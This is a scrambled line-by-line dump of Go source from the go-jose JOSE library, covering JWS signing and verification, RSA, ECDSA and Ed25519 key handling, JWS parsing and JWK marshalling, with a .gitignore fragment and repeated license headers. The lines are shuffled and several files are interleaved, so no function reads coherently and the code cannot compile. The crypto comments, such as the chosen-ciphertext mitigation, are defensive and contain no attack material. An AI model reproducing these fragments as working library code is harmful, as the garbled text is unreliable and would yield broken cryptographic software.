func (so 
// UnsafePayloadWithoutVerification returns the payload without
// DetachedVerify validates a detached signature on the given payload. In
"// header is confusing, and at least in ACME the two are considered to be mutually"
// a signature/object that has potentially multiple signers. This returns the index
 See the License for the specific language governing permissions and
rsaEncrypterVerifier{
// See https://github.com/square/go-jose/issues/157 for more context.
return ErrCryptoFailure
"base64.RawURLEncoding.EncodeToString(serializedProtected),"
publicKey func() 
continue
switch signingKey := signingKey.(type) {
"SignerOptions) WithHeader(k HeaderKey, v interface{}) "
so.ExtraHeaders[k] = v
return err
"key: verificationKey,"
} else {
type SignerOptions struct {
"return -1, Signature{}, ErrCryptoFailure"
case ed25519.PublicKey:
// NewSigner creates an appropriate signer based on the key type
"func makeJWSRecipient(alg SignatureAlgorithm, signingKey interface{}) (recipientSigInfo, error) {"
"return idx, sig, obj.payload, nil"
if err != nil {
case 
"headerAlgorithm: string(recipient.sigAlg),"
// Signer represents a signer which takes a payload and produces a signed JWS object.
rsa.PrivateKey:
publicKey := signingKey
recipients   []recipientSigInfo
 ok {
"return nil, fmt.Errorf(""square/go-jose: Error generating nonce: %v"", err)"
ecdsa.PublicKey:
"""fmt"""
protected := map[HeaderKey]interface{}{
if len(critical) > 0 {
signer.embedJWK = opts.EmbedJWK
case ed25519.PrivateKey:
import (
"return recipientSigInfo{}, errors.New(""square/go-jose: public key was unexpectedly not public"")"
"if ov, ok := verificationKey.(OpaqueVerifier)"
return func() 
"publicKey: verificationKey,"
"return newEd25519Signer(alg, signingKey)"
"""crypto/ecdsa"""
"verifier, err := newVerifier(verificationKey)"
"JSONWebSignature, error)"
base64.RawURLEncoding.EncodeToString(payload)))
signingKey)
"// In most cases, you will probably want to use Verify or VerifyMulti instead."
"// WithHeader adds an arbitrary value to the ExtraHeaders map, initializing it"
Options() SignerOptions
"opaqueVerifier{verifier: ov}, nil"
"// the pub key for embedding, but doesn't have extra params like key id."
 you may not use this file except in compliance with the License.
"for _, sig := range sigs {"
// callers are getting the verified value.
"SignerOptions) (Signer, error) {"
" distributed under the License is distributed on an ""AS IS"" BASIS,"
"func newJWKSigner(alg SignatureAlgorithm, signingKey JSONWebKey) (recipientSigInfo, error) {"
"NonceSource:  ctx.nonceSource,"
"if signer, ok := signingKey.(OpaqueSigner)"
// NonceSource represents a source of random nonces to go into JWS objects
"// This function does not support multi-signature, if you desire multi-sig"
return SignerOptions{
// DetachedVerifyMulti validates a detached signature on the given payload with
JSONWebKey
"return nil, ErrUnsupportedKeyType"
// of a JWS object. Some specifications which make use of JWS like to insert
"func NewMultiSigner(sigs []SigningKey, opts "
SignerOptions {
// is only useful if you have a payload and signature that are separated from
"return so.WithHeader(HeaderContentType, contentType)"
protected[headerJWK] = recipient.publicKey()
"return newSymmetricSigner(alg, signingKey)"
"return -1, Signature{}, nil, err"
"return newRSASigner(alg, signingKey)"
type Signer interface {
"}, nil"
"func newVerifier(verificationKey interface{}) (payloadVerifier, error) {"
// the signature and index to guarantee that callers are getting the verified value.
// SigningKey represents an algorithm/key used to sign a message.
type SigningKey struct {
Algorithm SignatureAlgorithm
type payloadVerifier interface {
func staticPublicKey(jwk 
alg := headers.getSignatureAlgorithm()
"return signer, nil"
" Unless required by applicable law or agreed to in writing, software"
"return recipientSigInfo{}, ErrUnsupportedKeyType"
"err := signer.addRecipient(sig.Algorithm, sig.Key)"
JSONWebKey {
// NewMultiSigner creates a signer for multiple recipients
"ExtraHeaders: ctx.extraHeaders,"
"return so.WithHeader(HeaderType, typ)"
"nonce, err := ctx.nonceSource.Nonce()"
obj := 
protected[headerNonce] = nonce
NonceSource NonceSource
// verifying it. The content returned from this function cannot be
if so.ExtraHeaders == nil {
"input := []byte(fmt.Sprintf(""%s.%s"","
// the other to avoid this confusion.
return 
"""crypto/rsa"""
// newVerifier creates a verifier based on the key type
edEncrypterVerifier{
"func (obj JSONWebSignature) Verify(verificationKey interface{}) ([]byte, error) {"
signature)
 limitations under the License.
"return nil, err"
rsa.PublicKey:
"return NewMultiSigner([]SigningKey{sig}, opts)"
// payload header. You cannot assume that the key received in a payload is
"for i, recipient := range ctx.recipients {"
// if necessary. It returns itself and so can be used in a fluent style.
package jose
switch verificationKey := verificationKey.(type) {
genericSigner) Sign(payload []byte) (
publicKey.Key = recipient.publicKey().Key
"v: %v"", k, err)"
 You may obtain a copy of the License at
ecdsa.PrivateKey:
"func (obj JSONWebSignature) DetachedVerify(payload []byte, verificationKey interface{}) error {"
"func (obj JSONWebSignature) DetachedVerifyMulti(payload []byte, verificationKey interface{}) (int, Signature, error) {"
" Licensed under the Apache License, Version 2.0 (the ""License"")"
"JSONWebSignature, error) {"
SignerOptions) WithType(typ ContentType) 
"// WithType adds a type (""typ"") header and returns the updated SignerOptions."
// Verify validates the signature on the object and returns the payload.
// VerifyMulti validates (one of the multiple) signatures on the object and
// Be careful when verifying signatures based on embedded JWKs inside the
"err = verifier.verifyPayload(input, signature.Signature, alg)"
// trusted.
// verification use VerifyMulti instead.
// additional values here. All values must be JSON-serializable.
"// WithContentType adds a content type (""cty"") header and returns the updated"
signature := obj.Signatures[0]
signer.extraHeaders = opts.ExtraHeaders
if len(obj.Signatures) > 1 {
"recipient, err := makeJWSRecipient(alg, signingKey.Key)"
"func NewSigner(sig SigningKey, opts "
// result of the JOSE spec. We've decided that this library will only include one or
"return recipient, nil"
nonceSource  NonceSource
"verifyPayload(payload []byte, signature []byte, alg SignatureAlgorithm) error"
"recipient, err := makeJWSRecipient(alg, signingKey)"
"idx, sig, err := obj.DetachedVerifyMulti(obj.payload, verificationKey)"
 recipient.publicKey() != nil {
     http://www.apache.org/licenses/LICENSE-2.0
"return newJWKSigner(alg, signingKey)"
protected[k] = v
// recipient.publicKey is a JWK synthesized for embedding when recipientSigInfo
" expecting only one"")"
signatureInfo.protected)[k] = makeRawMessage(b)
"input := obj.computeAuthData(payload, "
// SignerOptions represents options that can be set when creating signers.
return jwk
"for k, v := range ctx.extraHeaders {"
recipient.publicKey = staticPublicKey(
// SignerOptions.
signer    payloadSigner
JSONWebKey) func() 
Sign(payload []byte) (
return recipientInfo{
return recipientSigInfo{
"case RS256, RS384, RS512:"
"rsa.PrivateKey) (recipientSigInfo, error) {"
protected: 
"func (ctx ecKeyGenerator) genKey() ([]byte, rawHeader, error) {"
"priv, err := ecdsa.GenerateKey(ctx.publicKey.Curve, RandReader)"
// A generic EC-based encrypter/verifier
// newRSASigner creates a recipientSigInfo based on the given key.
generator := ecKeyGenerator{
"rBytesPadded := make([]byte, keyBytes)"
"return nil, ErrCryptoFailure"
// Sign the given payload
ecEncrypterVerifier{
// See: https://code.google.com/p/go/source/detail
switch algorithm {
type ecEncrypterVerifier struct {
keySize = 66
rsaDecrypterSigner{
"rawHeader{},"
"// prevent chosen-ciphertext attacks as described in RFC 3218, ""Preventing"
"return errors.New(""square/go-jose: ecdsa signature failed to verify"")"
type ecKeyGenerator struct {
"func newRSASigner(sigAlg SignatureAlgorithm, privateKey "
// A key generator for ECDH-ES
"deriveKey := func(algID string, size int) []byte {"
"cek, _, err := generator.genKey()"
signer: 
keyEncrypter: 
return recipientKeyInfo{
var err error
// produce 256 bytes of output). Reject this since it's invalid input.
// this will either use RSA-PKCS1v1.5 or RSA-OAEP (with SHA-1 or SHA-256).
default:
"return recipientSigInfo{}, errors.New(""invalid private key"")"
type edDecrypterSigner struct {
rsa.PSSOptions{
if epk == nil {
expectedBitSize = 256
if len(signature) != 2
"return nil, errors.New(""square/go-jose: invalid public key in epk header"")"
"_ = rsa.DecryptPKCS1v15SessionKey(rand.Reader, ctx.privateKey, jek, cek)"
type ecDecrypterSigner struct {
// DecryptPKCS1v15SessionKey sometimes panics on an invalid payload
return nil
type edEncrypterVerifier struct {
"apvData, err := headers.getAPV()"
algID     string
"out, err = rsa.SignPKCS1v15(RandReader, ctx.privateKey, hash, hashed)"
if !ok {
"return fmt.Errorf(""square/go-jose: invalid signature size, have %d bytes, wanted %d"", len(signature), 2"
"rsa.PublicKey) (recipientKeyInfo, error) {"
switch keyAlg {
"func (ctx rsaDecrypterSigner) signPayload(payload []byte, alg SignatureAlgorithm) (Signature, error) {"
"Key: privateKey.Public(),"
"// because of an index out of bounds error, which we want to ignore."
header: 
var keySize int
"keyAlg: keyAlg,"
keyBytes := curveBits / 8
"// must be keyBytes long, and the output must be 2"
publicKey 
 !ok {
case ECDH_ES:
"return josecipher.DeriveECDHES(algID, apuData.bytes(), apvData.bytes(), ctx.privateKey, publicKey, size)"
"case RS256, RS384, RS512, PS256, PS384, PS512:"
JSONWebKey{
// Decrypt the given payload and return the content encryption key.
"func newEd25519Signer(sigAlg SignatureAlgorithm, privateKey ed25519.PrivateKey) (recipientSigInfo, error) {"
"match := ecdsa.Verify(ctx.publicKey, hashed, r, s)"
publicKey: staticPublicKey(
"return rsa.EncryptOAEP(sha256.New(), RandReader, ctx.publicKey, cek, []byte{})"
"func newECDSASigner(sigAlg SignatureAlgorithm, privateKey "
"""errors"""
type rsaDecrypterSigner struct {
if !match {
"copy(rBytesPadded[keyBytes-len(rBytes):], rBytes)"
"""golang.org/x/crypto/ed25519"""
"return rsa.DecryptOAEP(sha256.New(), rand.Reader, ctx.privateKey, jek, []byte{})"
"ecdsa.PublicKey) (recipientKeyInfo, error) {"
case ES256:
keySize)
"_, _ = hasher.Write(payload)"
"return Signature{}, fmt.Errorf(""square/go-jose: expected %d bit key, got %d bits instead"", expectedBitSize, curveBits)"
"""gopkg.in/square/go-jose.v2/cipher"""
"// ECDH-ES mode doesn't wrap a key, the shared secret is used directly as the key."
"return ctx.decrypt(recipient.encryptedKey, headers.getAlgorithm(), generator)"
case RSA1_5:
"""gopkg.in/square/go-jose.v2/json"""
// newRSARecipient creates recipientKeyInfo based on the given key.
"priv.PublicKey,"
var expectedBitSize int
if sigAlg != EdDSA {
"return recipientInfo{}, err"
"case RS384, PS384:"
"""crypto/aes"""
"recipientInfo, generator keyGenerator) ([]byte, error) {"
"case RSA1_5, RSA_OAEP, RSA_OAEP_256:"
"SaltLength: rsa.PSSSaltLengthAuto,"
"return nil, errors.New(""square/go-jose: invalid apu header"")"
var hash crypto.Hash
"r, s, err := ecdsa.Sign(RandReader, ctx.privateKey, hashed)"
// A generic RSA-based encrypter/verifier
if publicKey == nil {
"// When decrypting an RSA-PKCS1v1.5 payload, we must take precautions to"
"header,"
rBytes := r.Bytes()
"// Input size is incorrect, the encrypted payload should always match"
 Copyright 2014 Square Inc.
" WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"// This has been fixed in Go 1.3.1 (released 2014/08/13), the recover()"
curveBits := ctx.privateKey.Curve.Params().BitSize
"func (ctx ecEncrypterVerifier) verifyPayload(payload []byte, signature []byte, alg SignatureAlgorithm) error {"
"// According to documentation, Write() on hash never fails"
"return rsa.EncryptPKCS1v15(RandReader, ctx.publicKey, cek)"
"encryptedKey: jek,"
// Encrypt the given payload and update the object.
 See the License for the specific language governing permissions and
rsaEncrypterVerifier{
generator.size = 32
"out := append(rBytesPadded, sBytesPadded...)"
"return rsa.VerifyPKCS1v15(ctx.publicKey, hash, hashed, signature)"
" !publicKey.Curve.IsOnCurve(publicKey.X, publicKey.Y) {"
"return out, headers, nil"
// Verify the given payload
"privateKey: privateKey,"
!topic/golang-dev/7ihX6Y6kx9k
case ES512:
"publicKey, ok := epk.Key.("
case RSA_OAEP_256:
// Verify that key management algorithm is supported by this encrypter
"""crypto/sha256"""
"Signature: out,"
"sBytesPadded := make([]byte, keyBytes)"
// Get a content encryption key for ECDH-ES
"func (ctx rsaEncrypterVerifier) encrypt(cek []byte, alg KeyAlgorithm) ([]byte, error) {"
"publicKey: ctx.publicKey,"
var out []byte
"return Signature{}, ErrUnsupportedAlgorithm"
// only exists for preventing crashes with unpatched versions.
"return Signature{}, err"
if err != nil {
// Get key size for EC key generator
edDecrypterSigner{
case ECDH_ES_A128KW:
return ErrUnsupportedAlgorithm
type rsaEncrypterVerifier struct {
"""fmt"""
"return recipientKeyInfo{}, ErrUnsupportedAlgorithm"
rsa.PublicKey
import (
return ctx.size
"""math/big"""
Key: 
"func newRSARecipient(keyAlg KeyAlgorithm, publicKey "
"kek, header, err := generator.genKey()"
case RSA_OAEP:
"""crypto/ecdsa"""
func (ctx ecKeyGenerator) keySize() int {
if expectedBitSize != curveBits {
"// ECDH-ES uses direct key agreement, no key unwrapping necessary."
// therefore deliberately ignoring errors here.
generator.size = 24
// A generic EC-based decrypter/signer
r=58ee390ff31602edb66af41ed10901ec95904d33
 you may not use this file except in compliance with the License.
"// Decrypt the given payload. Based on the key encryption algorithm,"
"return errors.New(""square/go-jose: ed25519 signature failed to verify"")"
" distributed under the License is distributed on an ""AS IS"" BASIS,"
"encryptedKey, err := ctx.encrypt(cek, alg)"
// newECDHRecipient creates recipientKeyInfo based on the given key.
"block, err := aes.NewCipher(key)"
"func newECDHRecipient(keyAlg KeyAlgorithm, publicKey "
"sig, err := ctx.privateKey.Sign(RandReader, payload, crypto.Hash(0))"
ecdsa.PrivateKey
"case RS256, PS256:"
keySize {
defer func() {
"ok := ed25519.Verify(ctx.publicKey, payload, signature)"
"func (ctx ecEncrypterVerifier) encryptKey(cek []byte, alg KeyAlgorithm) (recipientInfo, error) {"
"return deriveKey(string(headers.getEncryption()), generator.keySize()), nil"
switch alg {
s := big.NewInt(0).SetBytes(signature[keySize:])
"return cek, nil"
"sigAlg: sigAlg,"
if alg != EdDSA {
"func (ctx ecDecrypterSigner) signPayload(payload []byte, alg SignatureAlgorithm) (Signature, error) {"
keySize = 16
"return rsa.EncryptOAEP(sha1.New(), RandReader, ctx.publicKey, cek, []byte{})"
"if !ctx.privateKey.Curve.IsOnCurve(publicKey.X, publicKey.Y) {"
ecDecrypterSigner{
"}, nil"
case ECDH_ES_A192KW:
"publicKey: publicKey,"
"case ES256, ES384, ES512:"
header:       
hasher := hash.New()
"copy(sBytesPadded[keyBytes-len(sBytes):], sBytes)"
keySize = 48
"func (ctx ecDecrypterSigner) decryptKey(headers rawHeader, recipient "
" Unless required by applicable law or agreed to in writing, software"
"return rsa.DecryptOAEP(sha1.New(), rand.Reader, ctx.privateKey, jek, []byte{})"
keySize = 32
return Signature{
"return nil, errors.New(""square/go-jose: missing epk header"")"
"// Note: The random reader on decrypt operations is only used for blinding,"
privateKey ed25519.PrivateKey
"out, err = rsa.SignPSS(RandReader, ctx.privateKey, hash, hashed, "
// See: https://groups.google.com/forum/
if curveBits%8 > 0 {
hash = crypto.SHA384
// newECDSASigner creates a recipientSigInfo based on the given key.
"""crypto/rsa"""
case ES384:
rsa.PrivateKey
 limitations under the License.
"return nil, err"
// so stubbing is meanlingless (hence the direct use of rand.Reader).
hash = crypto.SHA512
"return nil, errors.New(""square/go-jose: invalid epk header"")"
hashed := hasher.Sum(nil)
"headerEPK: makeRawMessage(b),"
package jose
"return recipientKeyInfo{}, errors.New(""invalid public key"")"
"block, err := aes.NewCipher(kek)"
"""crypto/rand"""
if privateKey == nil {
"return nil, errors.New(""square/go-jose: invalid apv header"")"
 You may obtain a copy of the License at
// the size of the public modulus (e.g. using a 2048 bit key will
"case ECDH_ES_A128KW, ECDH_ES_A192KW, ECDH_ES_A256KW:"
"out := josecipher.DeriveECDHES(ctx.algID, []byte{}, []byte{}, priv, ctx.publicKey, ctx.size)"
keyBytes := ctx.privateKey.PublicKey.N.BitLen() / 8
"encryptedKey: encryptedKey,"
"return nil, ErrUnsupportedAlgorithm"
keySize = 24
// We serialize the outputs (r and s) into big-endian byte arrays and pad
hash = crypto.SHA256
" Licensed under the Apache License, Version 2.0 (the ""License"")"
"case PS256, PS384, PS512:"
case ECDH_ES_A256KW:
_ = recover()
sBytes := s.Bytes()
expectedBitSize = 384
"""crypto"""
"func (ctx rsaDecrypterSigner) decrypt(jek []byte, alg KeyAlgorithm, generator keyGenerator) ([]byte, error) {"
"return recipientInfo{}, ErrUnsupportedAlgorithm"
"func (ctx rsaDecrypterSigner) decryptKey(headers rawHeader, recipient "
privateKey 
r := big.NewInt(0).SetBytes(signature[:keySize])
"algID:     string(alg),"
"// Encrypt the given payload. Based on the key encryption algorithm,"
"b, err := json.Marshal("
"case RS512, PS512:"
publicKey ed25519.PublicKey
"case ECDH_ES, ECDH_ES_A128KW, ECDH_ES_A192KW, ECDH_ES_A256KW:"
"Signature: sig,"
keyBytes
"epk, err := headers.getEPK()"
// Perform some input validation.
"return rsa.VerifyPSS(ctx.publicKey, hash, hashed, signature, nil)"
keyBytes long.
generator.size = 16
// them with zeros on the left to make sure the sizes work out. Both arrays
"func (ctx edDecrypterSigner) signPayload(payload []byte, alg SignatureAlgorithm) (Signature, error) {"
ecdsa.PublicKey)
if keyBytes != len(jek) {
expectedBitSize = 521
"func (ctx edEncrypterVerifier) verifyPayload(payload []byte, signature []byte, alg SignatureAlgorithm) error {"
"jek, err := josecipher.KeyWrap(block, cek)"
"ecdsa.PrivateKey) (recipientSigInfo, error) {"
"return nil, nil, err"
size      int
     http://www.apache.org/licenses/LICENSE-2.0
// Use rand.Reader for RSA blinding
headers := rawHeader{
switch sigAlg {
"key := deriveKey(string(algorithm), keySize)"
if publicKey == nil 
"// the Million Message Attack on Cryptographic Message Syntax"". We are"
// A generic RSA-based decrypter/signer
"return recipientSigInfo{}, ErrUnsupportedAlgorithm"
"return nil, rawHeader{}, err"
"""crypto/sha1"""
ecdsa.PublicKey
"return josecipher.KeyUnwrap(block, recipient.encryptedKey)"
"func (ctx rsaEncrypterVerifier) verifyPayload(payload []byte, signature []byte, alg SignatureAlgorithm) error {"
"apuData, err := headers.getAPU()"
algorithm := headers.getAlgorithm()
"func (ctx rsaEncrypterVerifier) encryptKey(cek []byte, alg KeyAlgorithm) (recipientInfo, error) {"
 See the License for the specific language governing permissions and
     http://www.apache.org/licenses/LICENSE-2.0
 limitations under the License.
" Unless required by applicable law or agreed to in writing, software"
Web Token support available in a sub-package. The library supports both the
 you may not use this file except in compliance with the License.
Package jose aims to provide an implementation of the Javascript Object Signing
" Licensed under the Apache License, Version 2.0 (the ""License"")"
 Copyright 2014 Square Inc.
" WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
" distributed under the License is distributed on an ""AS IS"" BASIS,"
and Encryption set of standards. It implements encryption and signing based on
recipients.
package jose
"compact and full serialization formats, and has optional support for multiple"
"the JSON Web Encryption and JSON Web Signature standards, with optional JSON"
 You may obtain a copy of the License at
func (obj JSONWebSignature) FullSerialize() string {
type JSONWebSignature struct {
// Values in this header may or may not have been signed and in general
"Signature: newBuffer(signature),"
jwk := signature.Header.JSONWebKey
"func (obj JSONWebSignature) computeAuthData(payload []byte, signature "
raw.Signatures[i] = rawSignatureInfo{
"Protected: newBuffer(rawProtected),"
// The actual signature value
// FullSerialize serializes an object using the full JSON serialization format.
// rawJSONWebSignature represents a raw JWS JSON object. Used for parsing/serializing.
"// If we unmarshal Protected into a rawHeader with its explicit list of fields,"
"signature.Protected, err = signature.protected.sanitized()"
"obj.Signatures[i].Header, err = obj.Signatures[i].mergedHeaders().sanitized()"
if parsed.Header != nil 
rawHeader{}
var err error
Header    
"serializedProtected = """""
"json:""signatures,omitempty"""
"Payload:   newBuffer(payload),"
"Header:    signature.header,"
func (sig Signature) mergedHeaders() rawHeader {
"payload, err := base64.RawURLEncoding.DecodeString(parts[1])"
protected 
"signature.Header, err = signature.mergedHeaders().sanitized()"
"Signature: newBuffer(signature.Signature),"
raw := 
"json:""signature,omitempty"""
// Unprotected header. Values in this header were not signed
" parsed.Header.getNonce() != """" {"
signature.original = 
type rawSignatureInfo struct {
// Signature represents a single signature over the JWS payload and protected header.
byteBuffer        
return parseSignedFull(input)
"if strings.HasPrefix(input, ""{"") {"
"""errors"""
return raw.sanitized()
 (!jwk.Valid() 
"""strings"""
if len(parts) != 3 {
rawSignatureInfo
"obj.Signatures[i].Protected, err = obj.Signatures[i].protected.sanitized()"
// values. Prefer using Protected and Unprotected fields instead of this.
// we cannot marshal losslessly. So we have to keep around the original bytes.
// header struct only if those bytes are not available.
"""encoding/base64"""
"""gopkg.in/square/go-jose.v2/json"""
// Protected header. Values in this header were signed and
if parsed.Payload == nil {
payload []byte
if signature.original != nil 
"return obj, nil"
" sig.Header.getNonce() != """" {"
"for i, signature := range obj.Signatures {"
serializedProtected := mustSerializeJSON(obj.Signatures[0].protected)
func parseSignedFull(input string) (
if len(parsed.Signatures) == 0 {
// Copy value of sig
original := sig
 Copyright 2014 Square Inc.
" WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
rawHeader         
Signatures []Signature
"func (obj JSONWebSignature) CompactSerialize() (string, error) {"
"parts := strings.Split(input, ""."")"
out := rawHeader{}
// Check that there is not a nonce in the unprotected header
if obj.Signatures[i].protected != nil {
signature.protected = 
"obj.Signatures[i].Unprotected, err = obj.Signatures[i].header.sanitized()"
 See the License for the specific language governing permissions and
"base64.RawURLEncoding.EncodeToString(serializedProtected),"
Payload    
rawHeader
"""%s.%s.%s"","
JSONWebSignature{
parsed)
"json:""payload,omitempty"""
Signature []byte
// Compute data to be signed
raw.Protected = newBuffer(serializedProtected)
"// As per RFC 7515 Section 4.1.3, only public keys are allowed to be embedded."
} else {
// rawSignatureInfo represents a single JWS signature over the JWS payload and protected header.
"// Be careful about accessing these directly, prefer to use Verify() or"
return out
 !jwk.IsPublic()) {
raw := rawJSONWebSignature{
"Header:    parsed.Header,"
// parseSignedCompact parses a message in compact format.
"base64.RawURLEncoding.EncodeToString(obj.payload),"
// Merged header fields. Contains both protected and unprotected header
serializedProtected = base64.RawURLEncoding.EncodeToString(mustSerializeJSON(signature.protected))
if parsed.Protected != nil 
if err != nil {
rawJSONWebSignature{
if signature.header != nil {
"err := json.Unmarshal(sig.Protected.bytes(), obj.Signatures[i].protected)"
out.merge(sig.protected)
"""fmt"""
"return nil, errors.New(""square/go-jose: invalid embedded jwk, must be public key"")"
import (
out.merge(sig.header)
"// the original bytes of a protected header, and fall back on marshaling the"
func (parsed 
signature.header = parsed.Header
signature := Signature{}
if signature.protected != nil {
base64.RawURLEncoding.EncodeToString(payload)))
if obj.Signatures[0].protected != nil {
"return []byte(fmt.Sprintf(""%s.%s"","
if jwk != nil 
if len(obj.Signatures) == 1 {
// CompactSerialize serializes an object using the compact serialization format.
"serializedProtected,"
 you may not use this file except in compliance with the License.
rawHeader  
" distributed under the License is distributed on an ""AS IS"" BASIS,"
"base64.RawURLEncoding.EncodeToString(obj.Signatures[0].Signature)), nil"
obj.Signatures[i].original = 
 signature.original.Protected != nil {
// and in general should not be trusted.
Signature) []byte {
"signature, err := base64.RawURLEncoding.DecodeString(parts[2])"
// Protected header. This is necessary because the Protected header can
"rawProtected, err := base64.RawURLEncoding.DecodeString(parts[0])"
if len(obj.Signatures) != 1 
header    
// Get a header value
"Signatures: make([]Signature, len(parsed.Signatures)),"
obj.Signatures[i].Signature = sig.Signature.bytes()
rawJSONWebSignature) sanitized() (
return parsed.sanitized()
"// Make a fake ""original"" rawSignatureInfo to store the unprocessed"
 obj.Signatures[0].header != nil 
raw.Signature = newBuffer(obj.Signatures[0].Signature)
// Signatures attached to this object (may be more than one for multi-sig).
if obj.Signatures[i].header != nil {
original
byteBuffer 
// JSONWebSignature represents a signed JWS object after parsing.
" Unless required by applicable law or agreed to in writing, software"
Header Header
input = stripWhitespace(input)
// contain arbitrary fields not registered as part of the spec. See
func parseSignedCompact(input string) (
obj := 
"signature.Unprotected, err = signature.header.sanitized()"
} else if signature.protected != nil {
 len(sig.Protected.bytes()) > 0 {
"return nil, fmt.Errorf(""square/go-jose: compact JWS format must have three parts"")"
Protected 
section-4
"raw.Signatures = make([]rawSignatureInfo, len(obj.Signatures))"
signature.Signature = parsed.Signature.bytes()
 limitations under the License.
type rawJSONWebSignature struct {
"return nil, err"
obj.Signatures[i].protected = 
"return nil, ErrUnprotectedNonce"
package jose
Signature  
"obj.Signatures = append(obj.Signatures, signature)"
var parsed rawJSONWebSignature
 You may obtain a copy of the License at
"err := json.Unmarshal(parsed.Protected.bytes(), signature.protected)"
"// No signatures array, must be flattened serialization"
"return """", ErrNotSupported"
serializedProtected = signature.original.Protected.base64()
Protected  
 len(parsed.Protected.bytes()) > 0 {
" Licensed under the Apache License, Version 2.0 (the ""License"")"
"json:""header,omitempty"""
original  
"JSONWebSignature, error) {"
"for i, sig := range parsed.Signatures {"
// will be verified as part of the signature verification process.
"Payload: newBuffer(obj.payload),"
Signatures []rawSignatureInfo 
"payload:    parsed.Payload.bytes(),"
Protected Header
raw.Signatures[i].Protected = newBuffer(mustSerializeJSON(signature.protected))
// parseSignedFull parses a message in full format.
"return nil, fmt.Errorf(""square/go-jose: missing payload in JWS message"")"
return string(mustSerializeJSON(raw))
// https://tools.ietf.org/html/draft-ietf-jose-json-web-signature-41
return parseSignedCompact(input)
"json:""protected,omitempty"""
// ParseSigned parses a signed message in compact or full serialization format.
func ParseSigned(input string) (
raw.Header = obj.Signatures[0].header
Header     
Signature 
obj.Signatures[i].header = sig.Header
// VerifyMulti() to ensure that the data you're getting is verified.
// should not be trusted.
"Protected: parsed.Protected,"
if sig.Header != nil 
return fmt.Sprintf(
     http://www.apache.org/licenses/LICENSE-2.0
var serializedProtected string
type Signature struct {
"err := json.Unmarshal([]byte(input), "
"// This is used in computeAuthData, which will first attempt to use"
jwk := obj.Signatures[i].Header.JSONWebKey
if sig.Protected != nil 
rawSignatureInfo{
 obj.Signatures[0].protected == nil {
"Signature: parsed.Signature,"
Unprotected Header
// sanitized produces a cleaned-up JWS object from the raw JSON.
.out
.cov
.swp
jose-util/jose-util
.test
.pem
rsa.PrivateKey) (
case key.E == nil:
"newFixedSizeBuffer(ed, 32).base64()), nil"
 key.E == 0 
raw.Alg = k.Algorithm
"err = json.Unmarshal(data, "
curve = elliptic.P256()
order := curve.Params().P
default:
PublicKey: rsa.PublicKey{
"Y:   newFixedSizeBuffer(yBytes, size),"
"""crypto/x509"""
 len(key.Primes) < 2 {
"return """", err"
func (key rawJSONWebKey) rsaPublicKey() (
return keys
"return key, nil"
"""errors"""
 key.E == nil {
"Crv: ""Ed25519"","
"N:   newBuffer(pub.N.Bytes()),"
"""golang.org/x/crypto/ed25519"""
"{""e"":""%s"",""kty"":""RSA"",""n"":""%s""}"
func fromEcPrivateKey(ec 
// UnmarshalJSON reads a key from its JSON representation.
switch key.Crv {
"json:""e,omitempty"""
"return fmt.Sprintf(rsaThumbprintTemplate,"
"""crypto/elliptic"""
// JSONWebKey represents a public or private key in JWK format.
return size
"E:   newBufferFromInt(uint64(pub.E)),"
h := hash.New()
size = size 
if rsa.Precomputed.Dp != nil {
key := 
rsa.PublicKey)
// of JSONWebKeys.
xBytes := pub.X.Bytes()
// private key.
// https://tools.ietf.org/html/rfc7518
const rsaThumbprintTemplate = 
ecdsa.PrivateKey{
size := bitLen / 8
} else {
"return nil, fmt.Errorf(""square/go-jose: invalid EC private key, missing x/y/d values"")"
raw.Use = k.Use
// we have a private key whereas D == nil means we have only a public key.
if curveSize(curve) != len(key.X.data) {
return true
"return nil, fmt.Errorf(""square/go-jose: invalid EC key (nil, or X/Y missing)"")"
type JSONWebKeySet struct {
ecdsa.PublicKey:
"Y:     y,"
err := rv.Validate()
"Curve: curve,"
 pub.Y == nil {
K   
func (key rawJSONWebKey) ecPublicKey() (
section-6.2.2.1
coordLength := curveSize(curve)
// indicated hash algorithm.
"Kty: ""EC"","
if len(xBytes) > size 
"for _, cert := range k.Certificates {"
ret := 
"raw, err := fromEcPublicKey("
"raw, err = fromEcPublicKey(key)"
rv.Precomputed.Qinv = key.Qi.bigInt()
"missing = append(missing, ""E"")"
var curve elliptic.Curve
if dSize(curve) != len(key.D.data) {
"newFixedSizeBuffer(y.Bytes(), coordLength).base64()), nil"
"""crypto/rsa"""
rawJSONWebKey
if raw.D != nil {
"return nil, err"
rawJSONWebKey{
"json:""keys"""
case key.P == nil:
// Key convenience method returns keys by key ID. Specification states
"X:   newBuffer(pub),"
"func (key rawJSONWebKey) symmetricKey() ([]byte, error) {"
// Thumbprint computes the JWK Thumbprint of a key using the
if rsa.Precomputed.Qinv != nil {
x509.Certificate
"name, err := curveName(pub.Curve)"
return false
func dSize(curve elliptic.Curve) int {
 key.E == 0 {
Kty string      
if len(key) != 64 {
     http://www.apache.org/licenses/LICENSE-2.0
rv.Precomputed.Dp = key.Dp.bigInt()
raw.Q = newBuffer(rsa.Primes[1].Bytes())
"return nil, fmt.Errorf(""square/go-jose: invalid Ed key, missing x value"")"
raw.Dq = newBuffer(rsa.Precomputed.Dq.Bytes())
"copy(privateKey[32:], key.X.bytes())"
if err == nil {
"json:""x,omitempty"""
"json:""k,omitempty"""
type rawJSONWebKey struct {
"ecdsa.PublicKey, "
"json:""q,omitempty"""
"return h.Sum(nil), nil"
if bitLen%8 != 0 {
const ecThumbprintTemplate = 
"json:""qi,omitempty"""
if len(key) != 32 {
Certificates []
"crv, err := curveName(curve)"
curve = elliptic.P384()
"""strings"""
"json:""n,omitempty"""
"func (key rawJSONWebKey) edPrivateKey() (ed25519.PrivateKey, error) {"
raw.D = newBuffer(ed[0:32])
// Valid checks that the key contains the expected parameters.
var keys []JSONWebKey
"return nil, errors.New(""square/go-jose: invalid EC key, missing x/y values"")"
raw.D = newBuffer(rsa.D.Bytes())
func (key rawJSONWebKey) ecPrivateKey() (
switch key := k.Key.(type) {
"return nil, fmt.Errorf(""square/go-jose: unknown key type '%s'"", reflect.TypeOf(key))"
 Copyright 2014 Square Inc.
ecdsa.PublicKey{
func fromEdPublicKey(pub ed25519.PublicKey) 
"raw, err = fromEdPrivateKey(key)"
 See the License for the specific language governing permissions and
rsa.PublicKey{
if rsa.Precomputed.Dq != nil {
"json:""kid,omitempty"""
